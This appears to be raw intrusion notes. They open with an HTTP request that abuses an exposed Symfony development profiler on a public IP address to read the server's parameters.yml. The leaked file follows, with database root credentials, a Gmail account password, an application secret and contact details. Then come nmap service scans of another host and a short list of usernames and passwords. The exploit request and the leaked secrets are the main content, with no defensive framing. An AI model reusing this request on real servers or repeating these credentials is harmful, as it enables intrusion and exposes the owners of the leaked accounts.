```
GET /app_dev.php/_profiler/open?file=app/config/parameters.yml HTTP/1.1
Host: 41.77.188.126
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=0b60ffedsk57ao1696l973eli1
Upgrade-Insecure-Requests: 1



    # This file is auto-generated during the composer install
    parameters:
        database_host: 127.0.0.1
        database_port: null
        database_name: ugancdb
        database_user: root
        database_password: R0oot
        mailer_transport: smtp
        mailer_host: smtp.gmail.com
        mailer_user: kanbus65@gmail.com
        mailer_password: bingo123@
        secret: ThisTokenIsNotSoSecretChangeIt
        upload_path: '%kernel.root_dir%/../web/upload'
    twig:
        globals:
            telephone: '+224 621 13 46 93'
            fax: '02 35 00 00 00'
            adresse: '1 Rue Matoto, 76190 Bgessia '
            logo: uploads/Media/cf3d5664e1027b253bcf8027f5358696b7c6c5bb.png
            imgSansrien: '%kernel.root_dir%/../web/img/sansnrien.png'
            backgroundImage: '%kernel.root_dir%/../web/img/sansnrien.png'
            public_path: '%kernel.root_dir%/../web/'
    #       modeledebadge: 'C:\laragon\www\univ\web\img\modeledebadge.png'
            modeledebadge: '%kernel.root_dir%/../web/img/modeledebadge.png'
            logo2: 'C:/laragon/www/univ/web/img/logo2.png'
            upload_path: '%kernel.root_dir%/../web/'
            dateJour: now




```

```
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           ProFTPD
25/tcp   open  smtp          Postfix smtpd
53/tcp   open  domain        (unknown banner: none)
80/tcp   open  http          nginx
106/tcp  open  tcpwrapped
110/tcp  open  pop3          Dovecot pop3d
111/tcp  open  rpcbind       2-4 (RPC #100000)
143/tcp  open  imap          Dovecot imapd
443/tcp  open  ssl/http      nginx
465/tcp  open  ssl/smtp      Postfix smtpd
993/tcp  open  ssl/imap      Dovecot imapd
995/tcp  open  ssl/pop3      Dovecot pop3d
4190/tcp open  sieve         Dovecot Pigeonhole sieve 1.0
8443/tcp open  ssl/https-alt sw-cp-server

└─# nmap -sC -sV -p21,25,53,106,110,111,143,465,993,995,4190,8443 185.246.87.55


└─# nmap -sC -sV -p21,25,53,106,110,111,143,465,993,995,4190,8443 185.246.87.55
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-25 08:14 CST
Stats: 0:01:36 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.94% done; ETC: 08:16 (0:00:00 remaining)
Stats: 0:01:48 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.94% done; ETC: 08:16 (0:00:00 remaining)
Stats: 0:02:37 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 88.00% done; ETC: 08:17 (0:00:05 remaining)
Stats: 0:03:45 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 89.00% done; ETC: 08:18 (0:00:13 remaining)
Stats: 0:04:23 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 90.00% done; ETC: 08:19 (0:00:16 remaining)
Nmap scan report for frhb80923ds.ikexpress.com (185.246.87.55)
Host is up (0.19s latency).

PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           ProFTPD
| ssl-cert: Subject: commonName=frhb80923ds.ikexpress.com
| Subject Alternative Name: DNS:frhb80923ds.ikexpress.com
| Not valid before: 2023-11-06T11:16:07
|_Not valid after:  2024-02-04T11:16:06
25/tcp   open  smtp          Postfix smtpd
|_smtp-ntlm-info: ERROR: Script execution failed (use -d to debug)
| ssl-cert: Subject: commonName=Plesk/organizationName=Plesk/countryName=CH
| Not valid before: 2023-05-10T12:08:07
|_Not valid after:  2024-05-09T12:08:07
|_smtp-commands: frhb80923ds.ikexpress.com, PIPELINING, SIZE 10240000, ETRN, STARTTLS, AUTH DIGEST-MD5 CRAM-MD5 PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, CHUNKING
53/tcp   open  domain        (unknown banner: none)
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|     bind
|_    none
106/tcp  open  tcpwrapped
110/tcp  open  pop3          Dovecot pop3d
|_pop3-capabilities: SASL(PLAIN LOGIN DIGEST-MD5 CRAM-MD5) APOP RESP-CODES USER AUTH-RESP-CODE UIDL STLS TOP CAPA PIPELINING
111/tcp  open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
143/tcp  open  imap          Dovecot imapd
|_imap-capabilities: ID OK AUTH=DIGEST-MD5 post-login AUTH=PLAIN listed capabilities more IDLE LOGIN-REFERRALS have ENABLE STARTTLS SASL-IR IMAP4rev1 AUTH=CRAM-MD5A0001 AUTH=LOGIN LITERAL+ Pre-login
| ssl-cert: Subject: commonName=Plesk/organizationName=Plesk/countryName=CH
| Not valid before: 2023-05-10T12:08:07
|_Not valid after:  2024-05-09T12:08:07
465/tcp  open  ssl/smtp      Postfix smtpd
|_smtp-commands: Couldn't establish connection on port 465
| ssl-cert: Subject: commonName=Plesk/organizationName=Plesk/countryName=CH
| Not valid before: 2023-05-10T12:08:07
|_Not valid after:  2024-05-09T12:08:07
993/tcp  open  ssl/imap      Dovecot imapd
|_imap-capabilities: ID OK AUTH=DIGEST-MD5 post-login AUTH=PLAIN listed capabilities more IDLE LOGIN-REFERRALS have ENABLE SASL-IR Pre-login AUTH=CRAM-MD5A0001 AUTH=LOGIN LITERAL+ IMAP4rev1
| ssl-cert: Subject: commonName=Plesk/organizationName=Plesk/countryName=CH
| Not valid before: 2023-05-10T12:08:07
|_Not valid after:  2024-05-09T12:08:07
995/tcp  open  ssl/pop3      Dovecot pop3d
| ssl-cert: Subject: commonName=Plesk/organizationName=Plesk/countryName=CH
| Not valid before: 2023-05-10T12:08:07
|_Not valid after:  2024-05-09T12:08:07
4190/tcp open  sieve         Dovecot Pigeonhole sieve 1.0
8443/tcp open  ssl/https-alt sw-cp-server
|_http-server-header: sw-cp-server
| ssl-cert: Subject: commonName=frhb80923ds.ikexpress.com
| Subject Alternative Name: DNS:frhb80923ds.ikexpress.com
| Not valid before: 2023-11-06T11:16:07
|_Not valid after:  2024-02-04T11:16:06
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Server: sw-cp-server
|     Date: Mon, 25 Dec 2023 14:15:05 GMT
|     Content-Type: text/html
|     Content-Length: 906
|     Connection: close
|     ETag: "64510d7a-38a"
|     <!DOCTYPE html>
|     <!-- Copyright 1999-2023. Plesk International GmbH. All rights reserved. -->
|     <html lang="en" dir="ltr">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
|     <title>404 Page Not Found</title>
|     <link rel="shortcut icon" href="/favicon.ico">
|     <link rel="stylesheet" href="/ui-library/plesk-ui-library.css?3.31.0">
|     <script src="/ui-library/plesk-ui-library.min.js?3.31.0"></script>
|     <script src="/cp/javascript/vendors.js"></script>
|     <script src="/cp/javascript/main.js"></script>
|     <script src="/error_docs/uat.js?v3"></script>
|     <link href="/error_docs/app.css?3d13be0d07d5f541489c" rel="stylesheet"></head>
|     <body>
|     <div id
|   GetRequest: 
|     HTTP/1.1 303 See Other
|     Server: sw-cp-server
|     Date: Mon, 25 Dec 2023 14:15:03 GMT
|     Content-Type: text/html; charset=UTF-8
|     Connection: close
|     Expires: Fri, 28 May 1999 00:00:00 GMT
|     Last-Modified: Mon, 25 Dec 2023 14:15:03 GMT
|     Cache-Control: no-store, no-cache, must-revalidate
|     Cache-Control: post-check=0, pre-check=0
|     Pragma: no-cache
|     P3P: CP="NON COR CURa ADMa OUR NOR UNI COM NAV STA"
|     X-Frame-Options: SAMEORIGIN
|     X-XSS-Protection: 1; mode=block
|     Location: https://localhost:8443/login.php
|   HTTPOptions: 
|     HTTP/1.1 405 Not Allowed
|     Server: sw-cp-server
|     Date: Mon, 25 Dec 2023 14:15:04 GMT
|     Content-Type: text/html
|     Content-Length: 914
|     Connection: close
|     ETag: "64510d7a-392"
|     <!DOCTYPE html>
|     <!-- Copyright 1999-2023. Plesk International GmbH. All rights reserved. -->
|     <html lang="en" dir="ltr">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
|     <title>405 Method Not Allowed</title>
|     <link rel="shortcut icon" href="/favicon.ico">
|     <link rel="stylesheet" href="/ui-library/plesk-ui-library.css?3.31.0">
|     <script src="/ui-library/plesk-ui-library.min.js?3.31.0"></script>
|     <script src="/cp/javascript/vendors.js"></script>
|     <script src="/cp/javascript/main.js"></script>
|     <script src="/error_docs/uat.js?v3"></script>
|     <link href="/error_docs/app.css?3d13be0d07d5f541489c" rel="stylesheet"></head>
|_    <body>
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port53-TCP:V=7.94SVN%I=7%D=12/25%Time=65898E64%P=x86_64-pc-linux-gnu%r(
SF:DNSVersionBindReqTCP,31,"\0/\0\x06\x85\0\0\x01\0\x01\0\0\0\0\x07version
SF:\x04bind\0\0\x10\0\x03\xc0\x0c\0\x10\0\x03\0\0\0\0\0\x05\x04none");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8443-TCP:V=7.94SVN%T=SSL%I=7%D=12/25%Time=65898E67%P=x86_64-pc-linu
SF:x-gnu%r(GetRequest,1F5,"HTTP/1\.1\x20303\x20See\x20Other\r\nServer:\x20
SF:sw-cp-server\r\nDate:\x20Mon,\x2025\x20Dec\x202023\x2014:15:03\x20GMT\r
SF:\nContent-Type:\x20text/html;\x20charset=UTF-8\r\nConnection:\x20close\
SF:r\nExpires:\x20Fri,\x2028\x20May\x201999\x2000:00:00\x20GMT\r\nLast-Mod
SF:ified:\x20Mon,\x2025\x20Dec\x202023\x2014:15:03\x20GMT\r\nCache-Control
SF::\x20no-store,\x20no-cache,\x20must-revalidate\r\nCache-Control:\x20pos
SF:t-check=0,\x20pre-check=0\r\nPragma:\x20no-cache\r\nP3P:\x20CP=\"NON\x2
SF:0COR\x20CURa\x20ADMa\x20OUR\x20NOR\x20UNI\x20COM\x20NAV\x20STA\"\r\nX-F
SF:rame-Options:\x20SAMEORIGIN\r\nX-XSS-Protection:\x201;\x20mode=block\r\
SF:nLocation:\x20https://localhost:8443/login\.php\r\n\r\n")%r(HTTPOptions
SF:,440,"HTTP/1\.1\x20405\x20Not\x20Allowed\r\nServer:\x20sw-cp-server\r\n
SF:Date:\x20Mon,\x2025\x20Dec\x202023\x2014:15:04\x20GMT\r\nContent-Type:\
SF:x20text/html\r\nContent-Length:\x20914\r\nConnection:\x20close\r\nETag:
SF:\x20\"64510d7a-392\"\r\n\r\n<!DOCTYPE\x20html>\n<!--\x20Copyright\x2019
SF:99-2023\.\x20Plesk\x20International\x20GmbH\.\x20All\x20rights\x20reser
SF:ved\.\x20-->\n<html\x20lang=\"en\"\x20dir=\"ltr\">\n<head>\n\x20\x20\x2
SF:0\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20<meta\x20name=\"viewp
SF:ort\"\x20content=\"width=device-width,\x20initial-scale=1,\x20shrink-to
SF:-fit=no\">\n\x20\x20\x20\x20<title>405\x20Method\x20Not\x20Allowed</tit
SF:le>\n\x20\x20\x20\x20<link\x20rel=\"shortcut\x20icon\"\x20href=\"/favic
SF:on\.ico\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/ui-l
SF:ibrary/plesk-ui-library\.css\?3\.31\.0\">\n\x20\x20\x20\x20<script\x20s
SF:rc=\"/ui-library/plesk-ui-library\.min\.js\?3\.31\.0\"></script>\n\x20\
SF:x20\x20\x20<script\x20src=\"/cp/javascript/vendors\.js\"></script>\n\x2
SF:0\x20\x20\x20<script\x20src=\"/cp/javascript/main\.js\"></script>\n\x20
SF:\x20\x20\x20<script\x20src=\"/error_docs/uat\.js\?v3\"></script>\n<link
SF:\x20href=\"/error_docs/app\.css\?3d13be0d07d5f541489c\"\x20rel=\"styles
SF:heet\"></head>\n<body>\n<")%r(FourOhFourRequest,436,"HTTP/1\.1\x20404\x
SF:20Not\x20Found\r\nServer:\x20sw-cp-server\r\nDate:\x20Mon,\x2025\x20Dec
SF:\x202023\x2014:15:05\x20GMT\r\nContent-Type:\x20text/html\r\nContent-Le
SF:ngth:\x20906\r\nConnection:\x20close\r\nETag:\x20\"64510d7a-38a\"\r\n\r
SF:\n<!DOCTYPE\x20html>\n<!--\x20Copyright\x201999-2023\.\x20Plesk\x20Inte
SF:rnational\x20GmbH\.\x20All\x20rights\x20reserved\.\x20-->\n<html\x20lan
SF:g=\"en\"\x20dir=\"ltr\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"ut
SF:f-8\">\n\x20\x20\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=d
SF:evice-width,\x20initial-scale=1,\x20shrink-to-fit=no\">\n\x20\x20\x20\x
SF:20<title>404\x20Page\x20Not\x20Found</title>\n\x20\x20\x20\x20<link\x20
SF:rel=\"shortcut\x20icon\"\x20href=\"/favicon\.ico\">\n\x20\x20\x20\x20<l
SF:ink\x20rel=\"stylesheet\"\x20href=\"/ui-library/plesk-ui-library\.css\?
SF:3\.31\.0\">\n\x20\x20\x20\x20<script\x20src=\"/ui-library/plesk-ui-libr
SF:ary\.min\.js\?3\.31\.0\"></script>\n\x20\x20\x20\x20<script\x20src=\"/c
SF:p/javascript/vendors\.js\"></script>\n\x20\x20\x20\x20<script\x20src=\"
SF:/cp/javascript/main\.js\"></script>\n\x20\x20\x20\x20<script\x20src=\"/
SF:error_docs/uat\.js\?v3\"></script>\n<link\x20href=\"/error_docs/app\.cs
SF:s\?3d13be0d07d5f541489c\"\x20rel=\"stylesheet\"></head>\n<body>\n<div\x
SF:20id");
Service Info: Hosts:  frhb80923ds.ikexpress.com, frhb80923ds

```


users and pass
```
admini:admin
admin:adlm


```